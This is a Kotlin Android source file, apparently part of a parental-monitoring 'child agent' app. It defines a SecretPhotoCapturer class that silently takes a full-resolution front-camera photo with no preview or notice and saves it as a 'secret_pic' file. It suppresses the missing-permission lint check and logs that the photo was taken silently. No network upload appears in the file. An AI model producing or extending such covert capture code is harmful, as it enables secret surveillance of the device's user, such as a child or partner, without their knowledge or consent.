package com.example.xshield.childagent

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer

@SuppressLint("MissingPermission")
class SecretPhotoCapturer(private val context: Context) {
    private val TAG = "SecretPhotoCapturer"
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var captureSession: CameraCaptureSession? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    fun captureFrontCamera(onCaptured: (File?) -> Unit) {
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            var frontCameraId: String? = null
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = id
                    break
                }
            }

            if (frontCameraId == null) {
                Log.e(TAG, "No front camera found")
                onCaptured(null)
                return
            }

            startBackgroundThread()

            val characteristics = manager.getCameraCharacteristics(frontCameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val size = sizes?.maxByOrNull { it.width * it.height } ?: android.util.Size(1920, 1080)

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            imageReader?.setOnImageAvailableListener({ reader ->
                var image: Image? = null
                try {
                    image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        val file = File(context.cacheDir, "secret_pic_${System.currentTimeMillis()}.jpg")
                        var output: FileOutputStream? = null
                        try {
                            output = FileOutputStream(file)
                            output.write(bytes)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        } finally {
                            output?.close()
                        }
                        
                        Log.d(TAG, "Photo captured silently: ${file.absolutePath}")
                        
                        // Cleanup
                        stopCamera()
                        onCaptured(file)
                    } else {
                        stopCamera()
                        onCaptured(null)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                    stopCamera()
                    onCaptured(null)
                } finally {
                    image?.close()
                }
            }, backgroundHandler)

            manager.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    cameraDevice?.close()
                    cameraDevice = null
                    onCaptured(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    cameraDevice?.close()
                    cameraDevice = null
                    onCaptured(null)
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            e.printStackTrace()
            onCaptured(null)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
            onCaptured(null)
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = imageReader?.surface ?: return
            
            @Suppress("DEPRECATION")
            cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    if (cameraDevice == null) return
                    captureSession = session
                    try {
                        val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureBuilder.addTarget(surface)
                        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        session.capture(captureBuilder.build(), null, backgroundHandler)
                    } catch (e: CameraAccessException) {
                        e.printStackTrace()
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").apply { start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        backgroundThread = null
        backgroundHandler = null
    }

    private fun stopCamera() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        stopBackgroundThread()
    }
}
